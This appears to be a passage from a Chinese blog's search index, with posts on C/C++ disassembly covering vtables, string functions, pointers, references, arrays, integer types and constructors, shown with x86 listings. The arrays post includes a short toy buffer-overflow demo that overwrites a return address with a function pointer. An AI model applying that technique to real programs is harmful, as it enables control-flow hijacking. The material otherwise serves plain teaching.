call dword ptr [edx] //edx作为内存标号，直接调用虚表的地址 虚表大小1234567891011121314151617181920212223#include &lt;iostream&gt;using namespace std;#include &lt;string.h&gt;#include &lt;Windows.h&gt;class A{public: int a; int b; virtual void My_Print() { printf(&quot;Hello&quot;); }protected:private:};int main(){ A a; printf(&quot;%d\\r\\n&quot;,sizeof(a)); return 0;} 只要有虚函数的存在，就会多出来4字节 为什么会多出这四个字节，因为在我们的局部变量前面多了一个vfptr 我们查看vfptr里面存放着什么 虚表的位置存在于当前对象的开始位置； 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;#include &lt;string.h&gt;#include &lt;Windows.h&gt;class A{public: int a; int b; virtual void My_Print() { printf(&quot;Hello&quot;); } virtual void My_Print1() { ; } virtual void My_Print2() { ; }protected:private:};int main(){ A a; printf(&quot;%d\\r\\n&quot;,sizeof(a)); return 0;} 虚表的结构有几个虚函数，就写入几个虚函数地址 虚表的内容存放的是虚函数的地址；","link":"/2020/05/11/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%A4%9A%E6%80%81/"},{"title":"C反汇编 - 字符串指针","text":"C语言中没有类似java，python等面向对象的编程语言中string那样的特定的字符串类型，通常是将字符串放在一个字符数组中。 字符串指针字符串定义1234567891011#include &lt;stdio.h&gt;int main(){ //char str[6] = {'a','b','c','d','e','f'}; //错误方式 char str[7] = {'a','b','c','d','e','f','\\0'}; printf(&quot;%s&quot;,str); return 0;} 这样输出是不正确的，因为它会在内存中不停的向后找，直到找到’\\0’为止； 第二种方式： 12345678910#include &lt;stdio.h&gt;int main(){ char str[] = &quot;ABCDEF&quot;; printf(&quot;%s\\r\\n&quot;,str); return 0;} 反汇编代码： 123456789101112136: char str[] = &quot;ABCDEF&quot;;00401028 mov eax,[string &quot;ABCDEF&quot; (00422fa4)] ;从422FA4处取到ASCII码，复制到eax中0040102D mov dword ptr [ebp-8],eax ;给字符数组的前4个赋值00401030 mov cx,word ptr [string &quot;ABCDEF&quot;+4 (00422fa8)] ;后两个00401037 mov word ptr [ebp-4],cx0040103B mov dl,byte ptr [string &quot;ABCDEF&quot;+6 (00422faa)] ;0000401041 mov byte ptr [ebp-2],dl7: printf(&quot;%s\\r\\n&quot;,str);00401044 lea eax,[ebp-8]00401047 push eax00401048 push offset string &quot;%s\\r\\n&quot; (0042201c)0040104D call printf (00401080)00401052 add esp,8 第三种方法： 指针字符串只可以读，不可以修改 1234567891011121314#include &lt;stdio.h&gt;int main(){ //char str[7] = {'a','b','c','d','e','f','\\0'}; //char str[] = &quot;ABCDEF&quot;; //printf(&quot;%p\\r\\n&quot;,&amp;str); char* str = &quot;ABCEDF&quot;; printf(&quot;%s\\r\\n&quot;,str); return 0;} 反汇编代码： 123458: char* str = &quot;ABCEDF&quot;;00401028 mov dword ptr [ebp-4],offset string &quot;%p\\r\\n&quot; (00422fa4)9:10: printf(&quot;%s\\r\\n&quot;,str);0040102F mov eax,dword ptr [ebp-4] 字符串处理函数strlen12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ char Len1[7] = {'a','b','c'}; char Len2[9] = &quot;112233&quot;; char* Len = &quot;ABCEDFG&quot;; int k = strlen(Len); int j = strlen(Len); int l = strlen(Len); return 0;} strcpy123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ char Len1[9] = {'a','b','c'}; char Len2[9] = &quot;112233&quot;; //char* Len = &quot;ABCEDFG&quot;; strcpy(Len1,Len2); printf(&quot;%s&quot;,Len1); return 0;} 注意，拷贝的时候两个对象一定要保证同等大小，不然会造成错误 strcat123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ char Len1[9] = {'a','b','c'}; char Len2[9] = &quot;112233&quot;; //char* Len = &quot;ABCEDFG&quot;; strcat(Len1,Len2); printf(&quot;%s&quot;,Len1); return 0;} strcmp一样返回0，不一样返回非0 123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ char Len1[9] = {'a','b','c'}; char Len2[9] = &quot;112233&quot;; //char* Len = &quot;ABCEDFG&quot;; int i = strcmp(Len1,Len2); printf(&quot;%s&quot;,Len1); return 0;}","link":"/2020/05/05/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8C%87%E9%92%88/"},{"title":"C反汇编 - 封装","text":"将数据和操作数据的方法进行有机结合，隐藏对象的属性和实现细节，仅对外公开接口来和对象进行 交互。 封装封装定义通过反汇编来查看结构体指针与封装后的结构体： 1234567891011121314151617#include &lt;stdio.h&gt;struct Student{ int a; int b; int c; int d;};/*我们需要对结构体内的四个成员进行相加*/int main(){ struct Student s = {1,2,3,4}; struct Student* s1; s1 = &amp;s; printf(&quot;%d\\r\\n&quot;,s1-&gt;a+s1-&gt;b+s1-&gt;c+s1-&gt;d); return 0;} 我们跟随在反汇编中查看一下： 12345678910111213141516171814: struct Student s = {1,2,3,4};0040D408 mov dword ptr [ebp-10h],10040D40F mov dword ptr [ebp-0Ch],20040D416 mov dword ptr [ebp-8],30040D41D mov dword ptr [ebp-4],415: struct Student* s1;16: s1 = &amp;s;0040D424 lea eax,[ebp-10h]0040D427 mov dword ptr [ebp-14h],eax17: printf(&quot;%d\\r\\n&quot;,s1-&gt;a+s1-&gt;b+s1-&gt;c+s1-&gt;d);0040D42A mov ecx,dword ptr [ebp-14h]0040D42D mov edx,dword ptr [ecx]0040D42F mov eax,dword ptr [ebp-14h]0040D432 add edx,dword ptr [eax+4]0040D435 mov ecx,dword ptr [ebp-14h]0040D438 add edx,dword ptr [ecx+8]0040D43B mov eax,dword ptr [ebp-14h]0040D43E add edx,dword ptr [eax+0Ch] 我们可以看到，因为编译器在编译的时候，并没有办法确定我们结构体中有多少个成员，所以编译器在编译的时候，中间使用了大量的内存复制。 我们使用CPP中允许我们可以把函数写在结构体内部的方法来实现一下： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;struct Student{ int a; int b; int c; int d; int Add() { return a+b+c+d; }};/*我们需要对结构体内的四个成员进行相加*/int main(){ struct Student s = {1,2,3,4}; int r = s.Add(); printf(&quot;%d\\r\\n&quot;,r); return 0;} 我们在反汇编中查看一下： 1234567891020: struct Student s = {1,2,3,4};0040D408 mov dword ptr [ebp-10h],1 0040D40F mov dword ptr [ebp-0Ch],20040D416 mov dword ptr [ebp-8],30040D41D mov dword ptr [ebp-4],421:22: int r = s.Add();0040D424 lea ecx,[ebp-10h] ;结构体第一个成员0040D427 call @ILT+5(Student::Add) (0040100a)0040D42C mov dword ptr [ebp-14h],eax ;eax存放的是函数的返回结果，将返回值存放入[ebp-14]中 这就是封装的概念 类带有函数的结构体，成为类 成员函数定义在结构体内部的函数，成为成员函数 探测函数不占用结构体空间","link":"/2020/05/06/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%B0%81%E8%A3%85/"},{"title":"C反汇编 - 引用","text":"引用的本质就是给变量起别名； 引用引用必须赋初值 变量引用使用12345678int main(){ int i = 10; int&amp; j = i; //引用类型 j = 20; //使用引用的值修改原来的值 printf(&quot;%d\\r\\n&quot;,i); return 0;} 类的引用使用123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;class Base{public: int a;protected: int b;private: int c;};int main1(){ Base s; s.a = 10; Base&amp; ref = s; ref.a = 20; printf(&quot;%d\\r\\n&quot;,ref.a); return 0;} 数组的引用数组指针12345678910111213141516#include &lt;iostream&gt;using namespace std;int main(){ int Array[] = {1,2,3,4,5,6,7,8,9,10}; int(*p)[10] = &amp;Array; //给数组指针赋值的时候记得指针接受的是一个地址，所以要&amp;符号 for (int i = 0;i &lt; 10; i++) { printf(&quot;%d\\r\\n&quot;,(*p)[i]); //打印的时候需要指明类型 } return 0;} 引用数组12345678910111213int main(){ int Array[] = {1,2,3,4,5,6,7,8,9,10}; int(&amp;p)[10] = Array; p[3] = 100000; for (int i = 0;i &lt; 10; i++) { printf(&quot;%d\\r\\n&quot;,p[i]); } return 0;} 指针引用123456789int main(){ int******* x = (int*******)1; //指针两边类型必须一致 int*******&amp; ref = x; ref = (int*******)7; printf(&quot;%d\\r\\n&quot;,ref); return 0;} 引用与指针的区别 引用必须赋初值，且只能指向一个变量 对引用赋值，是对其指向的变量赋值 对引用做运算，就是对其指向的变量做运算 引用类型就是一个”弱化的指针” 12345678910111213int main(){ int x = 1; int* p = &amp;x; int&amp; ref = x; //printf(&quot;%d\\r\\n&quot;,(*p)); p++; ref++; printf(&quot;%d\\r\\n&quot;,(*p)); printf(&quot;%d\\r\\n&quot;,ref); return 0;} 12345678910111213141516171819202152: int x = 1;00401228 mov dword ptr [ebp-4],1 //把1存放到局部变量中53: int* p = &amp;x;0040122F lea eax,[ebp-4] //取地址放入eax中00401232 mov dword ptr [ebp-8],eax //将eax中的值放入ebp-8中54: int&amp; ref = x;00401235 lea ecx,[ebp-4] //取ebp-4（局部变量）的值存入ecx中00401238 mov dword ptr [ebp-0Ch],ecx //ecx的值放入ebp-c的位置55: //printf(&quot;%d\\r\\n&quot;,(*p));56: p++;0040123B mov edx,dword ptr [ebp-8]0040123E add edx,400401241 mov dword ptr [ebp-8],edx57: ref++;00401244 mov eax,dword ptr [ebp-0Ch]00401247 mov ecx,dword ptr [eax]00401249 add ecx,10040124C mov edx,dword ptr [ebp-0Ch]0040124F mov dword ptr [edx],ecx 类123456789101112131415161718192021222324class Point{public: Point(int x,int y) { a = x; b = y; }protected: int a;private: int b;};int main(){ Point Pt(1,2); Point* p = &amp;Pt; Point&amp; pt = Pt; p++; //pt++; 对象不可以做加法 return 0;} 引用在函数传递1234567891011121314int Add(int&amp; i) //接受参数的地址{ i++; return i;}int main(){ int x = 10; Add(x); printf(&quot;%d\\r\\n&quot;,x); return 0;} 引用在类中传递1234567891011121314151617181920212223242526272829303132class Pe{public: int x; int y; Pe(int a,int b) { this-&gt;x = a; this-&gt;y = b; } ~Pe() { ; }protected:private:};void PrintPoint(Pe&amp; refb,Pe* pb){ cout &lt;&lt; &quot; pb-&gt;x &quot; &lt;&lt; pb-&gt;x &lt;&lt; endl; cout &lt;&lt; &quot; pb-&gt;y &quot; &lt;&lt; pb-&gt;y &lt;&lt; endl; cout &lt;&lt; &quot; refb.x &quot; &lt;&lt; refb.x &lt;&lt; endl; cout &lt;&lt; &quot; refb.y &quot; &lt;&lt; refb.y &lt;&lt; endl;}int main(){ Pe p(1,2); PrintPoint(p,&amp;p); return 0;}","link":"/2020/05/08/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%BC%95%E7%94%A8/"},{"title":"C反汇编 - 指针","text":"指针也就是内存地址，指针变量是用来存放内存地址的变量，不同类型的指针变量所占用的存储单元长度是相同的，而存放数据的变量因数据的类型不同，所占用的存储空间长度也不同 指针指针类型定义123456char *x;short *y;int *z;float *f;double *b;Student *st; *任何基础数据类型加一个”“就可以变成一个指针类型** 总结： 1、带有*的变量类型的标准写法：变量类型* 变量名 2、任何类型都可以带* 加上*以后是新的类型 3、*可以是任意多个 赋值123456789101112131415161718#include &lt;stdio.h&gt;int main(){ char* x; short* y; int* z; float* f; double* b; x = (char*)&quot;1&quot;; y = x; f = (double*)&quot;20.34&quot;; b = f; printf(&quot;%c\\r\\n&quot;,*x); printf(&quot;%c\\r\\n&quot;,*y); return 0;} 指针宽度1、带*类型的变量赋值时只能使用“完整写法”. 2、带*类型的变量宽度永远是4字节、无论类型是什么，无论有几个*. 指针自增减1234567891011121314151617181920#include &lt;stdio.h&gt;int main(){ char**** c; int**** i; short**** s; c = 100; i = 100; s = 100; c++; i++; s++; printf(&quot;%d\\r\\n&quot;,c); printf(&quot;%d\\r\\n&quot;,i); printf(&quot;%d\\r\\n&quot;,s); return 0;} 输出结果： 1234567891011121314151617181920#include &lt;stdio.h&gt;int main(){ char* c; int* i; short* s; c = 100; i = 100; s = 100; c++; i++; s++; printf(&quot;%d\\r\\n&quot;,c); printf(&quot;%d\\r\\n&quot;,i); printf(&quot;%d\\r\\n&quot;,s); return 0;} *不带”“类型的变量，每次自增或自减都是操作为1** *带”“类型的变量，++或–的数量是去掉一个””后变量的宽度** 指针运算12345678910111213141516171819#include &lt;stdio.h&gt;int main(){ char* a; short* b; int* c; a = (char*)100; b = (short*)100; c = (int*)100; a = a+5; b = b+5; c = c+5; printf(&quot;%d\\r\\n&quot;,a); printf(&quot;%d\\r\\n&quot;,b); printf(&quot;%d\\r\\n&quot;,c); return 0;} 总结： 1、带*类型的变量可以加、减一个整数，但不能乘或者除. 2、带*类型变量与其他整数相加或者相减时： 带*类型变量 + N = 带*类型变量 + N*(去掉一个*后类型的宽度) 带*类型变量 - N = 带*类型变量 - N*(去掉一个*后类型的宽度) 指针比较123456789101112131415161718#include &lt;stdio.h&gt;int main(){ int* x; int* y; x = (int*)100; y = (int*)200; if(y&gt;x) { printf(&quot;GOOD\\r\\n&quot;); } else { printf(&quot;NO\\r\\n&quot;); } return 0;} 在做指针类型的比较的时候，一定要保证两个变量的类型是一样的 取地址使用*&amp;是地址符，类型是其后面的类型加一个“”，任何变量都可以使用&amp;来获取地址，但不能用在常量上。** 12345678910111213141516171819#include &lt;stdio.h&gt;struct Point{ int x; int y;};int main(){ char a; short b; int c; Point p; printf(&quot;%p %p %p %p \\r\\n&quot;,&amp;a,&amp;b,&amp;c,&amp;p); return 0;} 类型123456789101112131415161718#include &lt;stdio.h&gt;char a;short *b;int **c;int main(){ int x = (int)&amp;a; int y = (int)&amp;b; int z = (int)&amp;c; printf(&quot;%d\\r\\n&quot;,x); printf(&quot;%d\\r\\n&quot;,y); printf(&quot;%d\\r\\n&quot;,z); return 0;} 取值运算符定义1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ char* p = &quot;c&quot;; //printf(&quot;%c\\r\\n&quot;,p); printf(&quot;%c\\r\\n&quot;,*p); system(&quot;pause&quot;); return 0;} 错误用法： 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;int main(){ char* p = &quot;c&quot;; //printf(&quot;%c\\r\\n&quot;,p); printf(&quot;%c\\r\\n&quot;,*(p+1)); system(&quot;pause&quot;); return 0;} 查看错误的反汇编： 123456789106: char* p = &quot;c&quot;;00401028 mov dword ptr [ebp-4],offset string &quot;c&quot; (00424028)7: //printf(&quot;%c\\r\\n&quot;,p);8: printf(&quot;%c\\r\\n&quot;,*(p+1));0040102F mov eax,dword ptr [ebp-4]00401032 movsx ecx,byte ptr [eax+1] ;错误处，它会把+1当做寻址去对待；00401036 push ecx00401037 push offset string &quot;%c\\r\\n&quot; (0042512c)0040103C call printf (004011a0) *““加指针类型的类型是指针类型减去取值运算符** 使用12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int main(){ int x = 1; int *p = &amp;x; printf(&quot;%x %x\\r\\n&quot;,p,*(p)); *(p) = 2; printf(&quot;%p\\r\\n&quot;,*(p)); printf(&quot;%p %p\\r\\n&quot;,p,*(p)); return 0;} 多次查找12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt; int main(){ int x,y; int* px; int** px2; int*** px3; x = 10; px = &amp;x; px2 = &amp;px; px3 = &amp;px2; y = *(*(*(px3))); printf(&quot;%d\\r\\n&quot;,y); return 0;} 字符串","link":"/2020/05/04/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%8C%87%E9%92%88/"},{"title":"C反汇编 - 指针取值","text":"指针的取值办法和使用方式； 指针取值一级指针和多级指针一级指针123456789101112#include &lt;stdio.h&gt;int main(){ int* p = (int*)1; int x = *p; printf(&quot;%d %d\\r\\n&quot;,p[0],*p); return 0;} 反汇编： 12345615: printf(&quot;%d %d\\r\\n&quot;,p[1],*(p+1));0040D72F mov eax,dword ptr [ebp-4]0040D732 mov ecx,dword ptr [eax+4]0040D735 push ecx0040D736 mov edx,dword ptr [ebp-4]0040D739 mov eax,dword ptr [edx+4] 多级指针12345678910#include &lt;stdio.h&gt;int main(){ int** p = (int**)1; int x = *p; printf(&quot;%d %d\\r\\n&quot;,p[1][2],*(*(p+1)+2)); return 0;} 1234567898: printf(&quot;%d %d\\r\\n&quot;,p[1][2],*(*(p+1)+2));0040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax+4]00401035 mov edx,dword ptr [ecx+8]00401038 push edx00401039 mov eax,dword ptr [ebp-4]0040103C mov ecx,dword ptr [eax+4]0040103F mov edx,dword ptr [ecx+8]","link":"/2020/05/05/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%8C%87%E9%92%88%E5%8F%96%E5%80%BC/"},{"title":"C反汇编 - 指针数组与数组指针","text":"数组指针与指针数组是完全不同的两个概念； 指针数组定义123char Array[10]; //10charchar* Array[10]; //10指针(char*)Point* Array[10]; //10指针(Point* 定义代码： 123456789101112131415161718#include &lt;stdio.h&gt;int main(){ char* a = &quot;Hello&quot;; char* b = &quot;sYstemk1t&quot;; char* Array[2] = {a,b}; char* Array1[2]; Array1[1] = (char*)'A'; Array1[0] = (char*)'B'; char* Array3[2] = { &quot;Hello&quot;, &quot;sYstemk1t&quot; }; return 0;} 结构体数组指针12345678910111213141516171819202122#include &lt;stdio.h&gt;struct Student{ int x; int y;};int main(){ struct Student St[10]; //整体宽度80 struct Student St1; //8字节 struct Student *St2[10]; //40字节，4字节*10个成员 struct Student *St3; //4字节，每个指针占用4字节 int x = sizeof(St); int y = sizeof(St1); int z = sizeof(St2); int t = sizeof(St3); return 0;} 数组指针定义12345678910111213141516171819202122#include &lt;stdio.h&gt;int main(){ int Array[] = {1,2,3,4,5,6,7,8,9,10}; int* x = Array; //类型是int* int* y = (int*)&amp;Array; //数组指针 int(*px)[5]; char(*px1)[5]; int(*px2)[2][5]; char(*px3)[3][3][3]; px = (int(*)[5])1; px1 = (char(*)[5])1; px2 = (int(*)[2][5])1; px3 = (char(*)[3][3][3])1; px++; px1++; px2++; px3++; printf(&quot;%d %d %d %d\\r\\n&quot;,px,px1,px2,px3); return 0;} 使用一维数组1234567891011121314#include &lt;stdio.h&gt;int main(){ int Array[]= {1,2,3,4,5,6,7,8,9,10}; int (*px)[10] = &amp;Array; for(int i = 0;i&lt;10;i++) { printf(&quot;%d\\r\\n&quot;,(*px)[i]); //取值办法，(*px)[i]是下标 printf(&quot;%d\\r\\n&quot;,px[0][i]); px++; } return 0;} 二维数组12345678910111213141516171819202122#include &lt;stdio.h&gt;int main(){ int Array[][3] = { {1,2,3}, {4,5,6}, {7,8,9} }; int (*px)[3] = &amp;Array[0]; //加了&amp;的数组就会升维 for(int i = 0;i&lt;3;i++) { printf(&quot;%d\\r\\n&quot;,(*px)[i]); px++; } return 0;} 二维数组控制一维数组12345678910111213#include &lt;stdio.h&gt;int main(){ int Array[] = {1,2,3,4,5,6,7,8,9,0}; int (*px)[2][2] = (int (*)[2][2])Array; printf(&quot;%d %d\\r\\n&quot;,(*px)[0][0],(*px)[0][1]); printf(&quot;%d %d\\r\\n&quot;,(*px)[1][0],(*px)[1][1]); px++; printf(&quot;%d %d\\r\\n&quot;,(*px)[1][0],(*px)[1][1]); return 0; } 区别int *p[5] 与 int (*p)[5] 有什么区别？ 12[] 的优先级高于* 所以先组合成p[5]数组 再由int *说明 数组存储的类型 == int* p[5];() 的优先级高于[] 所以*先p先组合成指针 再由int[5]说明数组的宽度","link":"/2020/05/06/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%8C%87%E9%92%88%E6%95%B0%E7%BB%84%E4%B8%8E%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88/"},{"title":"C反汇编 - 数组","text":"数组是用于储存多个相同类型数据的集合. 数组一维数组数组的定义数组定义的格式： 数据类型 变量名[常量]; 数组的初始化数组也可以是定长和变长的； 123456789#include &lt;stdio.h&gt;int main(){ int Array[10] = {0,1,2,3,4,5,6,7,8,9}; //直接指明我们有多少个数据 int Array1[] = {1,2,3,4,5,6,7}; //让编译器去识别并填充 return 0;} 数组内存分配我们可以把每个类型的数据都做数组，查看esp的变化 提一个概念：栈的默认增长为16进制的40； int： 12300401019 lea edi,[ebp-68h]0040101C mov ecx,1Ah00401021 mov eax,0CCCCCCCCh char: 12300401019 lea edi,[ebp-4Ch]0040101C mov ecx,13h00401021 mov eax,0CCCCCCCCh short: 12300401019 lea edi,[ebp-54h]0040101C mov ecx,15h00401021 mov eax,0CCCCCCCCh 会发现每种类型对栈的增长操作是不一样的； 数组的读写123456789101112#include &lt;stdio.h&gt;int main(){ int Array[10]; int r; Array[0] = 1; Array[1] = 2; Array[2] = 3; r = Array[0]; return 0;} 反汇编代码： 1234567891011121314151617181920212223242526272829303100401010 push ebp00401011 mov ebp,esp00401013 sub esp,6Ch00401016 push ebx00401017 push esi00401018 push edi00401019 lea edi,[ebp-6Ch] ;默认堆栈增长大小40,6c-40=2c,因为局部变量占用了4字节，所以最高就是28，看局部变量定义的位置，需要查看的首先push的哪个变量0040101C mov ecx,1Bh00401021 mov eax,0CCCCCCCCh00401026 rep stos dword ptr [edi]5: int Array[10];6: int r;7: Array[0] = 1;00401028 mov dword ptr [ebp-28h],1 ;1赋值给ebp-28处8: Array[1] = 2;0040102F mov dword ptr [ebp-24h],29: Array[2] = 3;00401036 mov dword ptr [ebp-20h],310: r = Array[0];0040103D mov eax,dword ptr [ebp-28h]00401040 mov dword ptr [ebp-2Ch],eax11: return 0;00401043 xor eax,eax12: }00401045 pop edi00401046 pop esi00401047 pop ebx00401048 mov esp,ebp0040104A pop ebp0040104B ret 缓冲区溢出123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;void fun(){ while (1) { printf(&quot;IL&quot;); printf(&quot;\\r\\n&quot;); }}int Check(){ int Array[8]; Array[9] = (int)&amp;fun; return 0;}int main(){ Check(); system(&quot;pause&quot;); return 0;} 多维数组多维数组是对一维数组的扩展； 初始化C代码： 1234567#include &lt;stdio.h&gt;int main(){ int Array[3][4] = {{1,2,3,4},{5,6,7,8},{9,10,11,12}}; return 0;} 查看反汇编代码： 123456789101112131415165: int Array[3][4] = {{1,2,3,4},00401028 mov dword ptr [ebp-30h],10040102F mov dword ptr [ebp-2Ch],200401036 mov dword ptr [ebp-28h],30040103D mov dword ptr [ebp-24h],46: {5,6,7,8},00401044 mov dword ptr [ebp-20h],50040104B mov dword ptr [ebp-1Ch],600401052 mov dword ptr [ebp-18h],700401059 mov dword ptr [ebp-14h],87: {9,10,11,12}};00401060 mov dword ptr [ebp-10h],900401067 mov dword ptr [ebp-0Ch],0Ah0040106E mov dword ptr [ebp-8],0Bh00401075 mov dword ptr [ebp-4],0Ch 多维数组和一维数组在内存排列上是没有任何区别的 二维数组的读写123456789101112131415161718192021#include &lt;stdio.h&gt;int main(){ int i; int j; int Array[3][4] = {{1,2,3,4}, {5,6,7,8}, {9,10,11,12}}; Array[0][0] = 19; for(i = 0;i&lt;3;i++) { for(j = 0;j&lt;4;j++) { printf(&quot;Array[%d]&quot;,Array[i][j]); printf(&quot;\\r\\n&quot;); } } return 0;} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778790040D760 push ebp0040D761 mov ebp,esp0040D763 sub esp,78h0040D766 push ebx0040D767 push esi0040D768 push edi0040D769 lea edi,[ebp-78h]0040D76C mov ecx,1Eh0040D771 mov eax,0CCCCCCCCh0040D776 rep stos dword ptr [edi]5: int i;6: int j;7: int Array[3][4] = {{1,2,3,4},0040D778 mov dword ptr [ebp-38h],10040D77F mov dword ptr [ebp-34h],20040D786 mov dword ptr [ebp-30h],30040D78D mov dword ptr [ebp-2Ch],48: {5,6,7,8},0040D794 mov dword ptr [ebp-28h],50040D79B mov dword ptr [ebp-24h],60040D7A2 mov dword ptr [ebp-20h],70040D7A9 mov dword ptr [ebp-1Ch],89: {9,10,11,12}};0040D7B0 mov dword ptr [ebp-18h],90040D7B7 mov dword ptr [ebp-14h],0Ah0040D7BE mov dword ptr [ebp-10h],0Bh0040D7C5 mov dword ptr [ebp-0Ch],0Ch10: Array[0][0] = 19;0040D7CC mov dword ptr [ebp-38h],13h11: for(i = 0;i&lt;3;i++)0040D7D3 mov dword ptr [ebp-4],00040D7DA jmp main+85h (0040d7e5)0040D7DC mov eax,dword ptr [ebp-4]0040D7DF add eax,10040D7E2 mov dword ptr [ebp-4],eax0040D7E5 cmp dword ptr [ebp-4],30040D7E9 jge main+0D2h (0040d832)12: {13: for(j = 0;j&lt;4;j++)0040D7EB mov dword ptr [ebp-8],00040D7F2 jmp main+9Dh (0040d7fd)0040D7F4 mov ecx,dword ptr [ebp-8]0040D7F7 add ecx,10040D7FA mov dword ptr [ebp-8],ecx0040D7FD cmp dword ptr [ebp-8],40040D801 jge main+0D0h (0040d830)14: {15: printf(&quot;Array[%d]&quot;,Array[i][j]);0040D803 mov edx,dword ptr [ebp-4]0040D806 shl edx,40040D809 lea eax,[ebp+edx-38h]0040D80D mov ecx,dword ptr [ebp-8]0040D810 mov edx,dword ptr [eax+ecx*4]0040D813 push edx0040D814 push offset string &quot;Array[%d]&quot; (00422fb0)0040D819 call printf (004010d0)0040D81E add esp,816: printf(&quot;\\r\\n&quot;);0040D821 push offset string &quot;\\r\\n&quot; (004224a4)0040D826 call printf (004010d0)0040D82B add esp,417: }0040D82E jmp main+94h (0040d7f4)18: }0040D830 jmp main+7Ch (0040d7dc)19:20: return 0;0040D832 xor eax,eax21: }0040D834 pop edi0040D835 pop esi0040D836 pop ebx0040D837 add esp,78h0040D83A cmp ebp,esp0040D83C call __chkesp (00401150)0040D841 mov esp,ebp0040D843 pop ebp0040D844 ret","link":"/2020/05/02/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%95%B0%E7%BB%84/"},{"title":"C反汇编 - 整型","text":"在C语言中，整型包括整型常量和整型变量，整型变量又包括短整型、基本整型、长整型，它们都分为有符号和无符号两种版本; 整型C变量类型 整数类型char、short、int、long char 8BIT 1字节 0~0xFF short 16BIT 2字节 0~0xFFFF int 32BIT 4字节 0~0xFFFFFFFF long 32BIT 4字节 0~0xFFFFFFFF 有无符号数 有符号数和无符号数在内存中存储的时候没有任何区别； unsigned无符号数 123unsigned int y = 0xFFFFFFFF;printf(&quot;%u\\r\\n&quot;,y);printf(&quot;%d\\r\\n&quot;,y); signed有符号数 12345678910111213#include &lt;stdio.h&gt;int main(){ int x = -1; int i = 1; //unsigned int y = 0xFFFFFFFF; //printf(&quot;%u\\r\\n&quot;,y); //printf(&quot;%d\\r\\n&quot;,y); printf(&quot;%d\\r\\n&quot;,i); printf(&quot;%u\\r\\n&quot;,x); printf(&quot;%d\\r\\n&quot;,x); system(&quot;pause&quot;);} 扩展1234567#include &lt;stdio.h&gt;int main(){ signed char c = -1; int y = c; printf(&quot;&quot;)} 比较1234567891011#include &lt;stdio.h&gt;int main(){ unsigned char x = -1; unsigned char y = 1; if(x&gt;y) { printf(&quot;X&gt;Y\\r\\n&quot;); } system(&quot;pause&quot;);} 1234567891011#include &lt;stdio.h&gt;int main(){ char x = -1; char y = 1; if(x&gt;y) { printf(&quot;X&gt;Y\\r\\n&quot;); } system(&quot;pause&quot;);} 有无符号数在做比较的时候才有差异","link":"/2020/04/29/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E6%95%B4%E5%9E%8B/"},{"title":"C反汇编 - 构造函数","text":"构造函数的名称与类的名称是完全相同的 构造函数有参构造函数定义12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;class Student{public: Student() { cout &lt;&lt; &quot;自动调用构造函数&quot; &lt;&lt; endl; } Student(int _a = 0,int _b = 0) { a = _a; b = _b; } ~Student() { cout &lt;&lt; &quot;自动调用析构函数&quot; &lt;&lt; endl; }protected:private: int a; int b; char *p;};void Project(){ Student s1(1,2); cout &lt;&lt; &quot;析构函数&quot; &lt;&lt; endl;}void main(){ Project(); system(&quot;pause&quot;);} 构造函数的名称与类的名称是完全相同的， 并且不会返回任何类型，也不会返回 void。 构造函数可用于为某些成员变量设置初始值。 使用反汇编查看： 1234567891011121314151617181929: Student s1(1,2);004011AD push 2004011AF push 1004011B1 lea ecx,[ebp-18h] //this指针004011B4 call @ILT+165(Student::Student) (004010aa)0040124A mov dword ptr [ebp-4],ecx12: {13: a = _a;0040124D mov eax,dword ptr [ebp-4]00401250 mov ecx,dword ptr [ebp+8]00401253 mov dword ptr [eax],ecx14: b = _b;00401255 mov edx,dword ptr [ebp-4]00401258 mov eax,dword ptr [ebp+0Ch]0040125B mov dword ptr [edx+4],eax15: } 无参构造函数定义123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;struct Student{ int a; int b; int c; int d; Student() { printf(&quot;无参构造\\r\\n&quot;); }}; int main(){ Student s1; return 0;} 使用反汇编查看： 1234567891011121336: Student s1;00401038 lea ecx,[ebp-10h] //无参构造函数也会产生this指针0040103B call @ILT+0(Student::Student) (00401005)00401079 pop ecx0040107A mov dword ptr [ebp-4],ecx19: {20: printf(&quot;无参构造\\r\\n&quot;);0040107D push offset string &quot;\\xce\\xde\\xb2\\xce\\xb9\\xb9\\xd4\\xec\\r\\n&quot; (0042201c)00401082 call printf (004010f0)00401087 add esp,421: } 构造函数主要帮助我们解决参数的传递问题 析构函数定义析构函数不允许有返回值和参数 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;struct Student{ 